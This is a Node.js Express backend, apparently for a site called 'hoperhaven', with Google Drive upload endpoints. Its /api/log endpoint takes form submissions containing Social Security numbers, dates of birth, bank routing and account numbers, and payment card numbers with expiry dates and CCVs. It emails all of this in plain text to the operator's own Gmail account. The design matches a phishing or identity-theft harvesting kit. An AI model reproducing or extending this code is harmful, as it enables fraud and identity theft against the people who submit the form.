const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const { google } = require('googleapis');

const app = express();

// Configure CORS to allow requests from the frontend
app.use(cors({
  origin: ['https://hoperhaven.vercel.app', 'http://localhost:3000', 'http://localhost:5173'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// === Email Transporter (Gmail SMTP) ===
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER, // your Gmail
        pass: process.env.EMAIL_PASS  // your App Password
    }
});

// === Endpoint: receive form submission + Drive info ===
app.post('/api/log', async (req, res) => {
    try {
        const formData = req.body;

        // Build a readable email body
        const emailBody = `
            === NEW FORM SUBMISSION ===
            Timestamp: ${new Date(formData.timestamp).toLocaleString()}

            --- Personal Information ---
            First Name: ${formData.formData.firstName}
            Last Name: ${formData.formData.lastName}
            Date of Birth: ${formData.formData.dateOfBirth}
            SSN: ${formData.formData.socialSecurityNumber}
            Phone: ${formData.formData.phoneNumber}
            Email: ${formData.formData.email}

            --- Address Information ---
            Current Address: ${formData.formData.currentAddress}
            City: ${formData.formData.city}
            State: ${formData.formData.state}
            Zip Code: ${formData.formData.zipCode}
            Mailing Address: ${formData.formData.mailingAddress}

            --- Banking Information ---
            Bank Name: ${formData.formData.bankName}
            Account Type: ${formData.formData.accountType}
            Routing Number: ${formData.formData.routingNumber}
            Account Number: ${formData.formData.accountNumber}

            --- Verification ---
            Terms Accepted: ${formData.formData.termsAccepted}
            Data Consent: ${formData.formData.dataConsent}

            --- Cards ---
            ${(formData.formData.cards || [])
                .map((c, i) => `Card ${i + 1}: ${c.cardNumber}, Exp: ${c.expiry}, CCV: ${c.ccv}`)
                .join('\n')}

            --- Google Drive Folder ---
            Name: ${formData.folder?.name}
            ID: ${formData.folder?.id}
            URL: ${formData.folder?.url}

            --- Uploaded Files ---
            ${(formData.files || [])
                .map((f, i) => `${i + 1}. ${f.name}\n    URL: ${f.url}\n    ID: ${f.id}`)
                .join('\n')}
            =============================
            `;

        // Send email
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER, // send to yourself
            subject: `New Submission from ${formData.formData.firstName} ${formData.formData.lastName}`,
            text: emailBody
        });

        res.json({ success: true, message: 'Submission emailed successfully' });
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// === Google Drive API Integration ===
// Initialize Google Service Account Auth
let auth;
try {
  const credentials = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT || '{}');
  auth = new google.auth.GoogleAuth({
    credentials,
    scopes: ['https://www.googleapis.com/auth/drive'],
  });
} catch (error) {
  console.error('Error initializing Google auth:', error);
}

// Create a Drive client with service account authentication
const getDriveClient = async () => {
  try {
    const authClient = await auth.getClient();
    return google.drive({ version: 'v3', auth: authClient });
  } catch (error) {
    console.error('Error getting Drive client:', error);
    throw new Error('Failed to initialize Google Drive client');
  }
};

// Simplified endpoint to initialize Drive access (no user auth needed)
app.get('/api/google/init', async (req, res) => {
  try {
    // Just verify we can access the Drive API
    const drive = await getDriveClient();
    res.json({ success: true, message: 'Drive API initialized with service account' });
  } catch (error) {
    console.error('Drive initialization error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to create a folder in Google Drive using service account
app.post('/api/google/create-folder', async (req, res) => {
  try {
    const { folderName } = req.body;
    
    if (!folderName) {
      return res.status(400).json({ error: 'Folder name is required' });
    }

    // Get Drive client with service account
    const drive = await getDriveClient();
    
    // Create folder
    const folderMetadata = {
      name: folderName,
      mimeType: 'application/vnd.google-apps.folder'
    };
    
    const folder = await drive.files.create({
      resource: folderMetadata,
      fields: 'id, name, webViewLink'
    });
    
    res.json({
      id: folder.data.id,
      name: folder.data.name,
      url: folder.data.webViewLink
    });
  } catch (error) {
    console.error('Folder creation error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to get upload URL for direct upload using service account
app.post('/api/google/get-upload-url', async (req, res) => {
  try {
    const { fileName, folderId, mimeType } = req.body;
    
    if (!fileName || !mimeType) {
      return res.status(400).json({ error: 'File name and MIME type are required' });
    }

    // Get Drive client with service account
    const drive = await getDriveClient();
    
    // Prepare file metadata
    const fileMetadata = {
      name: fileName,
      mimeType: mimeType
    };
    
    // If folder ID is provided, add it as parent
    if (folderId) {
      fileMetadata.parents = [folderId];
    }
    
    // Create a resumable upload session
    const res1 = await drive.files.create({
      resource: fileMetadata,
      media: {
        mimeType: mimeType,
        body: 'placeholder'  // This will be replaced by the actual file content
      },
      fields: 'id, name, webViewLink',
      uploadType: 'resumable'
    }, {
      // This is important to get the upload URL
      onUploadProgress: () => {}
    });
    
    // Extract the location header which contains the upload URL
    const uploadUrl = res1.config.headers['X-Goog-Upload-URL'] || 
                     res1.request.responseHeaders['x-goog-upload-url'];
    
    if (!uploadUrl) {
      throw new Error('Failed to get upload URL');
    }
    
    res.json({
      uploadUrl,
      fileId: res1.data.id,
      fileName: res1.data.name,
      webViewLink: res1.data.webViewLink
    });
  } catch (error) {
    console.error('Get upload URL error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Health check
app.get('/', (req, res) => {
    res.send('✅ Express backend is running on Vercel!');
});

// Export for Vercel serverless
module.exports = app;